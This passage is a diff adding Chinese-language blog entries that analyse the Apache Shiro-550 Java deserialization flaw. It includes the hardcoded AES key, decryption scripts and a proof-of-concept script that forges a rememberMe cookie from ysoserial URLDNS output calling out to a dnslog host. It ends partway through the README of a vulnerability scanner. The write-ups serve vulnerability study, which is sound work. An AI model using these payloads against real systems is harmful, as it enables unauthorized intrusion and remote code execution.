@@ -231,6 +231,243 @@
       </tags>
   </entry>
   <entry>
+    <title>Java反序列化漏洞分析(一)-Shiro550</title>
+    <url>/2021/05/21/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%B8%80)-Shiro550/</url>
+    <content><![CDATA[<blockquote>
+<p>  本菜鸡算是第一次正式分析这种玩意，很烂，都是跟着网上的分析教程走一遍，算是打响java反序列化漏洞的第一枪。我还欠了两篇文章，记着呢。</p>
+</blockquote>
+<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>Apache Shiro是一个开源安全框架，提供身份验证、授权、密码学和会话管理。在它编号为550的issue 中爆出严重的Java反序列化漏洞。</p>
+<p>在Apache Shiro&lt;=1.2.4版本中AES加密时采用的key是<strong>硬编码</strong>在代码中的，这就为伪造cookie提供了机会。只要rememberMe的AES加密密钥泄露，无论shiro是什么版本都会导致反序列化漏洞。</p>
+<p>Shiro的“记住我”功能是设置cookie中的rememberMe值来实现。当后端接收到来自未经身份验证的用户的请求时，它将通过执行以下操作来寻找他们记住的身份：</p>
+<ol>
+<li> 检索cookie中RememberMe的值</li>
+<li> Base64解码</li>
+<li> 使用AES解密</li>
+<li> 反序列化</li>
+</ol>
+<p>漏洞原因在于第三步，在Apache Shiro&lt;=1.2.4版本中AES加密时采用的key是<strong>硬编码</strong>在代码中的，于是我们就可以构造RememberMe的值，然后让其反序列化执行。</p>
+<blockquote>
+<p>  只要rememberMe的AES加密密钥泄露，无论shiro是什么版本都会导致反序列化漏洞。</p>
+</blockquote>
+<h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>首先下载源码，并切换有漏洞的版本</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/apache/shiro.git  </span><br><span class="line"><span class="built_in">cd</span> shiro</span><br><span class="line">git checkout shiro-root-1.2.4</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210506223552.png" alt="image-20210506223546214"></p>
+<p>修改<code>samples/web/pom.xml</code>，支持jsp</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205022.png" alt="image-20210519210957110"></p>
+<ol>
+<li><p> Run</p>
+</li>
+<li><p> Edit Configurations</p>
+</li>
+<li><p> 添加TomcatServer(Local)</p>
+</li>
+<li><p> Server中配置Tomcat路径</p>
+</li>
+<li><p> Deployment中添加Artifact</p>
+</li>
+<li><p>选择sample-web:war exploded</p>
+<p> <img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205028.png" alt="image-20210519212838979"></p>
+<blockquote>
+<p>  这里若要使用burpsuite，注意端口不要和bp冲突</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205034.png" alt="image-20210519210846672"></p>
+<p>然后运行即可</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205039.png" alt="image-20210519212950043"></p>
+<h2 id="0x03-代码分析"><a href="#0x03-代码分析" class="headerlink" title="0x03 代码分析"></a>0x03 代码分析</h2><p>根据 <a href="https://issues.apache.org/jira/browse/SHIRO-550">https://issues.apache.org/jira/browse/SHIRO-550</a> 描述</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205046.png" alt="image-20210519211422639"></p>
+<p>这是几个重要的点:</p>
+<ul>
+<li>  检索<code>RememberMe</code> cookie的值</li>
+<li>  Base64解码</li>
+<li>  使用AES解密</li>
+<li>  使用Java序列化（<code>ObjectInputStream</code>）反序列化。</li>
+</ul>
+<h3 id="3-1-rememberMe-cookie"><a href="#3-1-rememberMe-cookie" class="headerlink" title="3.1 rememberMe cookie"></a>3.1 rememberMe cookie</h3><p>先来瞧瞧这个cookie，进入登录界面，在登录时，勾选<code>Remember Me</code><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205052.png" alt="image-20210519213228149"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rememberMe=+3nYB8HVKgNT9ewnrYDz2kMZA2QhOJucwaUx76IB0ya4ZesDlsfmreeeZ1ngxazK7jEsPKIWkxfdBfVEhPI+fiKqfyV0+tH4U+RcWPwITXq4NgY415Edvbb7Wmx6j+KW6C7RaEMf6A9ib8KvOwZizhXUw8d87EyaXpPd6RzJghoOJJoq7hP4gxLv1L5i9u1EZriLjUcnfaufS5R3jevlVgpYAMhuDWK8m9/lJZvK/IWm4/5RAmiDQEirwB8r57x/tZ71fs7baFXOZVueN/V7dJv8ySJP+ozQ/cy3bcx6+ZgF/MJvn4e5nLtM01u8jgg1rTk7fW+0jt61Znq1mq0BNnzAraTZg+0pSU36+aCiolYLh82BX/jJHweu9COVUyONKrXBcm8mPOz0vO8Kjq581OmACdiQgC1kI6qHrr+GloO0xlk4MJZiVzzYm5YdGkgDOPNGO2Lfh4U5hmprEzlf+5/7zwKILsMtOVrqZG5AXXW1XKTch62gq7jAWAXBmyIU</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>Base64</code>解码存储为二进制文件</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author : yhy</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">rememberMe = <span class="string">&#x27;+3nYB8HVKgNT9ewnrYDz2kMZA2QhOJucwaUx76IB0ya4ZesDlsfmreeeZ1ngxazK7jEsPKIWkxfdBfVEhPI+fiKqfyV0+tH4U+RcWPwITXq4NgY415Edvbb7Wmx6j+KW6C7RaEMf6A9ib8KvOwZizhXUw8d87EyaXpPd6RzJghoOJJoq7hP4gxLv1L5i9u1EZriLjUcnfaufS5R3jevlVgpYAMhuDWK8m9/lJZvK/IWm4/5RAmiDQEirwB8r57x/tZ71fs7baFXOZVueN/V7dJv8ySJP+ozQ/cy3bcx6+ZgF/MJvn4e5nLtM01u8jgg1rTk7fW+0jt61Znq1mq0BNnzAraTZg+0pSU36+aCiolYLh82BX/jJHweu9COVUyONKrXBcm8mPOz0vO8Kjq581OmACdiQgC1kI6qHrr+GloO0xlk4MJZiVzzYm5YdGkgDOPNGO2Lfh4U5hmprEzlf+5/7zwKILsMtOVrqZG5AXXW1XKTch62gq7jAWAXBmyIU&#x27;</span></span><br><span class="line"></span><br><span class="line">rememberMe_64 = base64.b64decode(rememberMe)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;rememberMe&quot;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f.write(rememberMe_64)</span><br></pre></td></tr></table></figure>
+
+<p>内容如下:<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205104.png" alt="image-20210519214639370"></p>
+<p>上述内容中并没有在<a href="">初探Java反序列化漏洞（一）</a>中提到过的序列化的数据流以魔术数字和版本号<code>AC ED 00 05</code> 等字样。这是因为上述关键步骤中提到了<code>AES解密</code>，所以需要去跟一下源码。</p>
+<h3 id="3-2-Shiro-500-中的-AES-解密"><a href="#3-2-Shiro-500-中的-AES-解密" class="headerlink" title="3.2 Shiro 500 中的 AES 解密"></a>3.2 Shiro 500 中的 AES 解密</h3><p>在IDEA中<code>ctrl+shift+f</code> 全局搜索<code>AES</code><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205115.png" alt="image-20210520201956272"></p>
+<p>在<code>src/main/java/org/apache/shiro/mgt/AbstractRememberMeManager.java</code>中找到了</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong>Base64.decode(“kPH+bIxk5D2deZiIxcaaaA==”)</strong> 就是我们要找的硬编码密钥，因为AES是对称加密，即加密密钥也同样是解密密钥。</p>
+<p>然后看看shiro是怎么处理解密的，向下看，找到</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Decrypts the byte array using the configured &#123;<span class="doctag">@link</span> #getCipherService() cipherService&#125;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> encrypted the encrypted byte array to decrypt</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the decrypted byte array returned by the configured &#123;<span class="doctag">@link</span> #getCipherService () cipher&#125;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] decrypt(<span class="keyword">byte</span>[] encrypted) &#123;</span><br><span class="line">    <span class="keyword">byte</span>[] serialized = encrypted;</span><br><span class="line">    CipherService cipherService = getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());</span><br><span class="line">        serialized = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> serialized;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>函数名<code>decrypt</code>，显而易见，是处理解密的，<code>cipherService</code>是一个接口,调用了其中的<code>decrypt</code>解密方法，需要两个变量<code>encrypted</code>(被加密的数组) 和 <code>getDecryptionCipherKey()</code>(获取解密秘钥)，前面说了AES是对称加密，即加密密钥也同样是解密密钥。而且从程序中也能看到，确实是同一个，通过在该类中查找<code>setDecryptionCipherKey()</code>方法，可以看到<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205124.png" alt="image-20210520204036228"></p>
+<p>再搜索<code>setCipherKey</code>，可以看到构造方法中传入了<code>DEFAULT_CIPHER_KEY_BYTES</code>也就是<code>Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)</code>的值<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205131.png" alt="image-20210520204113812"></p>
+<p>然后再看一下<code>CipherService</code>这个接口的<code>decrypt</code>的具体实现，<code>ctrl+右键</code>跟进去看看<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205138.png" alt="image-20210520205000830"></p>
+<p>这只是个接口，全局搜索<code>implements CipherService</code> 发现<code>src/main/java/org/apache/shiro/crypto/JcaCipherService.java</code>实现了<code>CipherService</code>接口，进去看看<code>decrypt</code>方法</p>
+<p>为了方便，我们在这里下个断点，发现是<code>CBC</code>模式，并且 <code>iv</code>偏移量的值为 **byte[] iv = new byte[16] ** <img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520215312.png" alt="image-20210520215309770"></p>
+<p>利用下面的脚本解密之前<code>base64解码</code>后生成的<code>rememberMe</code>文件得到<code>decrypt.bin</code>文件</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pip install pycrypto</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_rememberme_file</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fpr:</span><br><span class="line">        key  =  <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">        mode =  AES.MODE_CBC</span><br><span class="line">        IV   = <span class="string">b&#x27; &#x27;</span> * <span class="number">16</span></span><br><span class="line">        encryptor = AES.new(base64.b64decode(key), mode, IV=IV)</span><br><span class="line">        remember_bin = encryptor.decrypt(fpr.read())</span><br><span class="line">    <span class="keyword">return</span> remember_bin</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;decrypt.bin&quot;</span>, <span class="string">&#x27;wb+&#x27;</span>) <span class="keyword">as</span> fpw:</span><br><span class="line">        fpw.write(decode_rememberme_file(sys.argv[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520221430.png" alt="image-20210520221418998"></p>
+<p>这是 Java 序列化的标志，说明解密成功</p>
+<h3 id="3-3-反序列化"><a href="#3-3-反序列化" class="headerlink" title="3.3 反序列化"></a>3.3 反序列化</h3><p>看看解密之后的操作，回到<code>src/main/java/org/apache/shiro/mgt/AbstractRememberMeManager.java</code>类中，看看，从哪里调用了<code>decrypt</code>函数，<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521074327.png" alt="image-20210521073527745"></p>
+<p>在<code>convertBytesToPrincipals</code>这里解密之后，执行了反序列化<code>deserialize</code>，进去瞅瞅<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521074332.png" alt="image-20210521074103621"></p>
+<p>通过获取<code>getSerializer()</code>来调用反序列化，再看看<code>SetSerializer</code><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521074338.png" alt="image-20210521074230279"></p>
+<p><strong>src/main/java/org/apache/shiro/io/DefaultSerializer.java</strong><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521074341.png" alt="image-20210521074304324"></p>
+<p>这里使用的是默认反序列化类，没有任何检验，<code>readobject()</code>触发反序列化!<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521092011.png" alt="image-20210521074629505"></p>
+<h2 id="0x04-漏洞探测"><a href="#0x04-漏洞探测" class="headerlink" title="0x04 漏洞探测"></a>0x04 漏洞探测</h2><p>现在我们知道了<strong>shiro550</strong>在获取到<strong>rememberMe cookie</strong>的值后，通过硬编码的KEY **kPH+bIxk5D2deZiIxcaaaA==<strong>进行AES解密，解密完成之后直接调用默认的反序列化的</strong>readobject()**方法，没有经过任何的校验。</p>
+<p>具体的 <strong>Payload</strong> 也就呼之欲出了，将<code>payload</code>通过AES加密伪造<strong>rememberMe cookie</strong>,我们通过刚才的解密流程知道<strong>shiro550</strong>采用的<strong>CBC</strong>模式、**byte[] iv = new byte[16]**， 通过脚本伪造，利用<code>ysoserial.jar</code> 神器生成<code>URLDNS</code>探测的payload进行探测(shiro550自带来commons-collections3.2.1，关于commons-collections的相关漏洞，后续分析)<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521092006.png" alt="image-20210521091543563"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># －*-* coding:utf-8</span></span><br><span class="line"><span class="comment"># @Time    :  2020/10/16 17:36</span></span><br><span class="line"><span class="comment"># @Author  : nice0e3</span></span><br><span class="line"><span class="comment"># @FileName: poc.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    ：https://www.cnblogs.com/nice0e3/</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rememberme</span>(<span class="params">command</span>):</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial.jar&#x27;</span>, <span class="string">&#x27;URLDNS&#x27;</span>, command],</span><br><span class="line">                             stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = <span class="string">b&#x27; &#x27;</span> * <span class="number">16</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 替换dnslog </span></span><br><span class="line">    payload = rememberme(<span class="string">&#x27;http://5fzd8f.dnslog.cn&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload.cookie&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> fpw:</span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br><span class="line">        res = <span class="string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode())</span><br><span class="line">        fpw.write(res)</span><br></pre></td></tr></table></figure>
+
+<p>运行生成</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">rememberMe=Y3M07legS/64hNfAmb+zfY1Ch/sXxGbop7rMR3YgWuFwTmdZEGj1q0oaHMowhUpUopo4XNjBkIDbn+w4Zhq0QO+9GXX4+hZA67NiM5U6sXcxtxLZCdlRB4JlrT8JrtTs+OyejDVh2HXLgI29lmMSDVoVW5OV3EHISFbFS+MmQv6JGqt60OZHxw6y1uhwYcWiRZ2kqGwDbNE/Xj+vNA1/5CdvnElY3jVvo8YJ8Suy8zznVuMlR2OsjksaHel8dXoUSXRiTAsMnn0SJIqKm7KI98YqTQaSn4F7VnEqaaNyciQwgOoOV/MphOWjVcTWsEDgdUjT5WgI+pJSZpX9JIo1XT75SPpWkiIw9Sseptaor5fsPMPNuk/lf5bWSpnwFTlTUuClsDJbOXjgvcew77i9tw==</span><br></pre></td></tr></table></figure>
+
+<p>替换打成功<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521091957.png" alt="image-20210521084722601"></p>
+<p>其实一开始是失败的，shiro550自带的包是commons-collections3.2.1,原生情况下直接用ysoserial打，是不会成功的，其他位置中直接添加了<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521092002.png" alt="image-20210521091756305"></p>
+<p>commons-collections4的包，才可以顺畅复现。至于为啥原生的3.2.1不能触发漏洞，以及可不可以触发漏洞，下篇文章再分析。</p>
+<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p>Apache Shiro Java 反序列化漏洞分析 <a href="https://blog.knownsec.com/2016/08/apache-shiro-java/">https://blog.knownsec.com/2016/08/apache-shiro-java/</a> </p>
+<p>Java安全之Shiro 550反序列化漏洞分析 <a href="https://www.anquanke.com/post/id/225442#h3-8">https://www.anquanke.com/post/id/225442#h3-8</a> </p>
+<p>ysoserial <a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
+]]></content>
+      <categories>
+        <category>漏洞原理</category>
+      </categories>
+      <tags>
+        <tag>漏洞原理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java反序列化漏洞分析(二)-Shiro550</title>
+    <url>/2021/05/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%BA%8C)-Shiro550/</url>
+    <content><![CDATA[<blockquote>
+<p>  这是一篇失败的文章，要学的东西太多了，高看我自己了。终究是纸上得来终觉浅，绝知此事要躬行</p>
+</blockquote>
+<h2 id="0x00-纠错"><a href="#0x00-纠错" class="headerlink" title="0x00 纠错"></a>0x00 纠错</h2><p>首先纠正一下上篇文章<a href="">Java反序列化漏洞分析(一)-Shiro550</a>的错误错误，上篇提到dnslog使用原生环境搭建没有打成功，这是<strong>错的</strong>、<strong>错的</strong>、<strong>错的</strong>，其实是可以打的。我给搞错了，<strong>URLDNS</strong> 这个利用链本身不依赖于任何第三方库，同时不限制jdk的版本，所以通常是用来检测反序列化的点（目标出网），我当时没打成功，是因为我做实验时，用了<strong>同一条</strong>dnslog的url打过一遍，第二遍死活不出结果，写这篇文章时又测了几次，发现是url的锅，要不停的变换才会一直出结果<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210524215703.png" alt="原生的shiro550可以使用dnslog探测"></p>
+<blockquote>
+<p>  Java默认有TTL缓存，DNS解析会进行缓存，所以可能会出现第一次收到DNS的log，后面可能收不到的情况。</p>
+</blockquote>
+<h2 id="0x01-原生Shiro550执行命令"><a href="#0x01-原生Shiro550执行命令" class="headerlink" title="0x01 原生Shiro550执行命令"></a>0x01 原生Shiro550执行命令</h2><p>当使用<strong>URLDNS链</strong>打过去，在DNSLOG平台有回显的时候，就说明这个地方存在反序列化漏洞。</p>
+<p>但是要利用的话还得是使用CC链等利用链去进行命令的执行（shiro550中自带的是cc3.2.1版本的组件）。</p>
+<p>经过测试<strong>ysoserial</strong>拥有的CommonsCollections利用链从1-7都无法成功执行命令, 都是报错<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210529211912.png" alt="image-20210528211554019"></p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210529211926.png" alt="image-20210525211529910"></p>
+<p>无法反序列化一个数组，经常敲代码，修bug的都知道，报错的位置一般都在最下边的，去看看</p>
+<p><code>at org.apache.shiro.io.DefaultSerializer.deserialize(DefaultSerializer.java:77)</code> 直接点过去看看<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210529211917.png" alt="image-20210526220345069"></p>
+<p>可以看到在<a href="">初探Java反序列化漏洞(一)</a>中提到的重点函数<strong>readObject()<strong>函数，但是又有一点点不一样，它这里是</strong>new</strong>了一个<strong>ClassResolvingObjectInputStream</strong>,而非传统的<strong>ObjectInputStream</strong> 问题就可能出现在这里，全局搜索看下<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210529211939.png" alt="image-20210526220837880"></p>
+<p>这里是通过 <strong>ClassUtils.forName(osc.getName());<strong>来反射调用的，而前面都是通过</strong>Class.forName(“java.lang.Runtime”);</strong> 来进行反射执行命令的<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210529211949.png" alt="image-20210526221020003"></p>
+<p>直接在这里下断点，然后使用CC2链打一下，调试半天也没看懂，太菜了，先记下 参考文章中说的是</p>
+<blockquote>
+<p>  Shiro resovleClass 使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class。</p>
+</blockquote>
+<p>别人在环境中引入了<code>commons-collections4.0</code>，使得ysoserial的<code>CommonsCollections2</code>利用链可以成功利用。这是因为<code>CommonsCollections2</code>用的是非数组形式的利用链，在该利用链上没有出现数组类型的对象，这使得在shiro的环境下，可以正确执行命令。（后续学习这条链）</p>
+<h2 id="0x01-构造新的利用链"><a href="#0x01-构造新的利用链" class="headerlink" title="0x01 构造新的利用链"></a>0x01 构造新的利用链</h2><p>我不会。。。 看半天还是没看懂，前置知识缺的有点多，直接放链接吧</p>
+<p><a href="https://www.anquanke.com/post/id/192619#h2-3">https://www.anquanke.com/post/id/192619#h2-3</a> </p>
+<p>总结就是利用链中的<code>ChainedTransformer</code>这个类的利用是无法成功的，因为它的类属性<code>iTransformers</code>是数组类型的<code>Transformers</code>，最终通过使用<code>TemplatesImpl.newTransformer</code>函数来动态<code>loadClass</code>构造好的evil class bytes</p>
+<p>通过大佬改造的<a href="https://github.com/wh1t3p1g/ysoserial">https://github.com/wh1t3p1g/ysoserial</a> CommonsCollections10 利用链打一下<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210529212125.png" alt="image-20210527084745187"></p>
+<p>这个图<strong>又是假</strong>的，淦，用大佬的CC10链打了之后，突然怀疑之前的命令搞错了，我之前是用<code>whoami</code>测试的，我想起了mac命令执行不太一样，重新用<code>open -a Calculator</code>试了一遍，发现CC2链又可以成功了，瞬间凌乱（已经把添加的commons-collections4.0版本给注释了），这两天一直在重新测试找原因，通过重新下载shiro，切换版本重新来一遍，CC2并不可以打原生的shiro550，用大佬的CC10也打不出来，原因也找不到，前置知识缺的太多了，再搞下去也是浪费时间。</p>
+<p>最终找到我为啥可以打成功，因为我在<code>shiro/samples/web</code>目录下生成过war包，当时是在测试4.0版本RCE，生成的target目录没有删除，之后启动的时候应该都是使用target目录下的东西，即使去除4.0版本依旧没用，生成的war包并没有改变还是可以RCE的4.0版本，搞得我怀疑人生。还有说<strong>JRMP</strong> 这个<strong>Gadget</strong>可以打，也是废了，没成功。</p>
+<p>不搞了，心累，等补充完知识，再重新来吧</p>
+<p>接下来通过<a href="https://github.com/frohoff/ysoserial%E8%BF%99%E4%B8%AA%E9%A1%B9%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE%E5%90%A7%EF%BC%8C%E6%85%A2%E6%85%A2%E6%9D%A5%E5%90%A7%E3%80%82">https://github.com/frohoff/ysoserial这个项目来学习java反序列化的利用链吧，慢慢来吧。</a></p>
+<h2 id="0x02-参考"><a href="#0x02-参考" class="headerlink" title="0x02 参考"></a>0x02 参考</h2><p>推荐一个Chrome插件—<strong>Toby for Chrome</strong>，适合舍不得关标签页，留待后续研究的。</p>
+<p>中途参考的文章太多了，就用这个插件生成的分享链接吧</p>
+<p><a href="https://www.gettoby.com/p/m9955hzbsf6s">https://www.gettoby.com/p/m9955hzbsf6s</a></p>
+]]></content>
+      <categories>
+        <category>漏洞原理</category>
+      </categories>
+      <tags>
+        <tag>漏洞原理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SScan  一款src捡洞扫描器</title>
+    <url>/2021/01/11/SScan/</url>
+    <content><![CDATA[<h2 id="SScan"><a href="#SScan" class="headerlink" title="SScan"></a>SScan</h2><p><a href="https://github.com/yhy0/SScan/"><img src="https://img.shields.io/badge/python-3.6|3.7|3.8-blue" alt="python"></a></p>
+<p><a href="https://github.com/yhy0/SScan/"><img src="https://img.shields.io/badge/release-v0.8-brightgreen" alt="python"></a></p>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>一款src捡洞扫描器，因没时间挖src，毕竟挖src是个费时费力的活，自19年8月起入坑至今，依靠 <a href="https://github.com/lijiejie/BBScan.git">BBScan</a> 扫描出的信息和漏洞，利用业余时间从扫描报告中的资产<strong>捡洞</strong>和找洞，已经3次jd月度前十。萌发出自己写扫描器挖洞的念头，自动挖一些简单漏洞，赚点零花钱，同时提升一下开发能力，毕竟搞安全的不能不懂开发。</p>
+<p>目前 <a href="https://github.com/yhy0/SScan">SScan</a> 的主要逻辑还是 <a href="https://github.com/lijiejie/BBScan.git">BBScan</a>。</p>
+<h3 id="使用效果图"><a href="#使用效果图" class="headerlink" title="使用效果图"></a>使用效果图</h3><p><img src="https://raw.githubusercontent.com/yhy0/PicGoImg/master/sscan/20210311094318.gif"></p>
+<p>扫描结束后，结果报告在report目录下，并且存在漏洞时，默认会使用浏览器打开报告</p>
+<h2 id="使用及参数"><a href="#使用及参数" class="headerlink" title="使用及参数"></a>使用及参数</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 SScan.py version                                查看版本</span><br><span class="line">python3 SScan.py --<span class="built_in">help</span>                                 获取帮助</span><br><span class="line">python3 SScan.py --host example.com run                 单个目标</span><br><span class="line">python3 SScan.py --file domains.txt run                 读取一个.txt文件</span><br><span class="line">python3 SScan.py --dire /Users/yhy/Desktop/<span class="built_in">dirs</span>/ run    读取目录下的所有.txt</span><br><span class="line">python3 SScan.py --file domains.txt  --network 24 run   network设置一个子网掩码(8 ~ 31)，</span><br><span class="line">                配合上面3个参数中任意一个。将扫描Target/MASK 网络下面的所有IP</span><br><span class="line">python3 SScan.py --host 127.0.0.1 --script unauthorized_access_redis,unauthorized_access_rsync run</span><br><span class="line">                    只使用指定脚本 </span><br><span class="line"></span><br><span class="line">您可以通过在 config/setting.py 文件中指定fofa api信息, 调用fofa搜索更多的Web服务</span><br><span class="line"></span><br><span class="line">其它参数：</span><br><span class="line">    --t             扫描线程数, 默认10。</span><br><span class="line">    --full          处理所有子目录。 /x/y/z/这样的链接，/x/ /x/y/也将被扫描，默认为True</span><br><span class="line">    --crawl         爬取主页的&lt;a&gt;标签， 默认为True</span><br><span class="line">    --checkcdn      检查域名是否存在CDN，若存在则不对解析出的ip进行规则和脚本探测，默认为True</span><br><span class="line">    --browser       检测完成后，使用默认浏览器打开扫描报告，默认为True</span><br><span class="line">    --script        指定要使用的脚本，--script unauthorized_access_redis unauthorized_access_rsync, ... 脚本在scripts目录下</span><br><span class="line">    --rule          指定要扫描的规则，--rule RuleFileName1,RuleFileName2,... 规则在rules目录下</span><br><span class="line">    --script_only   只使用脚本进行扫描，不使用规则</span><br><span class="line">    --noscripts     不使用脚本扫描</span><br><span class="line">    --fofa    